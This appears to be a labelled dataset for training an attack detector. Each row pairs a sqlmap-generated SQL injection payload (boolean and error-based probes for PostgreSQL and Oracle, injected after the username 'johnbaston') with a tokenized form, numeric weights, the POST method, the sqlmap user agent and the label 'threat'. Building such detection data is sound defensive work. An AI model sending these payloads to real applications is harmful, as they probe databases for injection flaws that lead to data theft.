johnbaston%' AND (SELECT (CASE WHEN (6703=9357) THEN NULL ELSE CAST((CHR(78)||CHR(122)||CHR(120)||CHR(67)) AS NUMERIC) END)) IS NULL AND '%'=',STR PRCNT SQUT AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND SQUT PRCNT SQUT EQ SQUT,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%' AND (SELECT (CASE WHEN (6703=9357) THEN NULL ELSE CAST((CHR(78)||CHR(122)||CHR(120)||CHR(67)) AS NUMERIC) END)) IS NULL AND '%'=',STR PRCNT SQUT AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND SQUT PRCNT SQUT EQ SQUT,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%' AND (SELECT (CASE WHEN (3527=3527) THEN NULL ELSE CAST((CHR(107)||CHR(82)||CHR(119)||CHR(80)) AS NUMERIC) END)) IS NULL AND '%'=',STR PRCNT SQUT AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND SQUT PRCNT SQUT EQ SQUT,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%' AND (SELECT (CASE WHEN (3527=3527) THEN NULL ELSE CAST((CHR(107)||CHR(82)||CHR(119)||CHR(80)) AS NUMERIC) END)) IS NULL AND '%'=',STR PRCNT SQUT AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND SQUT PRCNT SQUT EQ SQUT,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston) AND (SELECT (CASE WHEN (4395=5160) THEN NULL ELSE CAST((CHR(73)||CHR(66)||CHR(67)||CHR(85)) AS NUMERIC) END)) IS NULL AND (4345=4345,STR RPRN AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND LPRN INT EQ INT,0.12121212121212122 0.15151515151515152 0.18181818181818182 0.21212121212121213 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.21212121212121213 0.18181818181818182 0.15151515151515152 0.12121212121212122,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston) AND (SELECT (CASE WHEN (4395=5160) THEN NULL ELSE CAST((CHR(73)||CHR(66)||CHR(67)||CHR(85)) AS NUMERIC) END)) IS NULL AND (4345=4345,STR RPRN AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND LPRN INT EQ INT,0.12121212121212122 0.15151515151515152 0.18181818181818182 0.21212121212121213 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.21212121212121213 0.18181818181818182 0.15151515151515152 0.12121212121212122,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston) AND (SELECT (CASE WHEN (3527=3527) THEN NULL ELSE CAST((CHR(107)||CHR(82)||CHR(119)||CHR(80)) AS NUMERIC) END)) IS NULL AND (1168=1168,STR RPRN AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND LPRN INT EQ INT,0.12121212121212122 0.15151515151515152 0.18181818181818182 0.21212121212121213 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.21212121212121213 0.18181818181818182 0.15151515151515152 0.12121212121212122,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston) AND (SELECT (CASE WHEN (3527=3527) THEN NULL ELSE CAST((CHR(107)||CHR(82)||CHR(119)||CHR(80)) AS NUMERIC) END)) IS NULL AND (1168=1168,STR RPRN AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND LPRN INT EQ INT,0.12121212121212122 0.15151515151515152 0.18181818181818182 0.21212121212121213 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.21212121212121213 0.18181818181818182 0.15151515151515152 0.12121212121212122,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston)) AND (SELECT (CASE WHEN (7253=2599) THEN NULL ELSE CAST((CHR(111)||CHR(80)||CHR(71)||CHR(88)) AS NUMERIC) END)) IS NULL AND ((1404=1404,STR RPRN RPRN AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND LPRN LPRN INT EQ INT,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston)) AND (SELECT (CASE WHEN (3527=3527) THEN NULL ELSE CAST((CHR(107)||CHR(82)||CHR(119)||CHR(80)) AS NUMERIC) END)) IS NULL AND ((8743=8743,STR RPRN RPRN AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND LPRN LPRN INT EQ INT,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston)) AND (SELECT (CASE WHEN (3527=3527) THEN NULL ELSE CAST((CHR(107)||CHR(82)||CHR(119)||CHR(80)) AS NUMERIC) END)) IS NULL AND ((8743=8743,STR RPRN RPRN AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND LPRN LPRN INT EQ INT,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston AND (SELECT (CASE WHEN (3527=3527) THEN NULL ELSE CAST((CHR(107)||CHR(82)||CHR(119)||CHR(80)) AS NUMERIC) END)) IS NULL,STR AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL,0.14814814814814814 0.18518518518518517 0.2222222222222222 0.25925925925925924 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.25925925925925924 0.2222222222222222 0.18518518518518517 0.14814814814814814,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston AND (SELECT (CASE WHEN (3527=3527) THEN NULL ELSE CAST((CHR(107)||CHR(82)||CHR(119)||CHR(80)) AS NUMERIC) END)) IS NULL,STR AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL,0.14814814814814814 0.18518518518518517 0.2222222222222222 0.25925925925925924 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.25925925925925924 0.2222222222222222 0.18518518518518517 0.14814814814814814,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston AND (SELECT (CASE WHEN (2743=8765) THEN NULL ELSE CAST((CHR(122)||CHR(90)||CHR(68)||CHR(66)) AS NUMERIC) END)) IS NULL-- EufK,STR AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL DSCMT STR,0.13793103448275862 0.1724137931034483 0.20689655172413793 0.24137931034482757 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.24137931034482757 0.20689655172413793 0.1724137931034483 0.13793103448275862,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston AND (SELECT (CASE WHEN (2743=8765) THEN NULL ELSE CAST((CHR(122)||CHR(90)||CHR(68)||CHR(66)) AS NUMERIC) END)) IS NULL-- EufK,STR AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL DSCMT STR,0.13793103448275862 0.1724137931034483 0.20689655172413793 0.24137931034482757 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.24137931034482757 0.20689655172413793 0.1724137931034483 0.13793103448275862,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston AND (SELECT (CASE WHEN (3527=3527) THEN NULL ELSE CAST((CHR(107)||CHR(82)||CHR(119)||CHR(80)) AS NUMERIC) END)) IS NULL-- Kjbf,STR AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL DSCMT STR,0.13793103448275862 0.1724137931034483 0.20689655172413793 0.24137931034482757 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.24137931034482757 0.20689655172413793 0.1724137931034483 0.13793103448275862,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston AND (SELECT (CASE WHEN (3527=3527) THEN NULL ELSE CAST((CHR(107)||CHR(82)||CHR(119)||CHR(80)) AS NUMERIC) END)) IS NULL-- Kjbf,STR AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL DSCMT STR,0.13793103448275862 0.1724137931034483 0.20689655172413793 0.24137931034482757 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.24137931034482757 0.20689655172413793 0.1724137931034483 0.13793103448275862,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston') AND (SELECT (CASE WHEN (4210=6279) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4210) END) FROM DUAL) IS NULL AND ('fVby'='fVby",STR SQUT RPRN AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE STR DOT STR DOT STR INT CMMA INT END FROM DUAL IS NULL AND LPRN SQUT STR SQUT EQ SQUT STR,0.12121212121212122 0.15151515151515152 0.18181818181818182 0.21212121212121213 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.21212121212121213 0.18181818181818182 0.15151515151515152 0.12121212121212122,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston') AND (SELECT (CASE WHEN (4210=6279) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4210) END) FROM DUAL) IS NULL AND ('fVby'='fVby",STR SQUT RPRN AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE STR DOT STR DOT STR INT CMMA INT END FROM DUAL IS NULL AND LPRN SQUT STR SQUT EQ SQUT STR,0.12121212121212122 0.15151515151515152 0.18181818181818182 0.21212121212121213 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.21212121212121213 0.18181818181818182 0.15151515151515152 0.12121212121212122,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
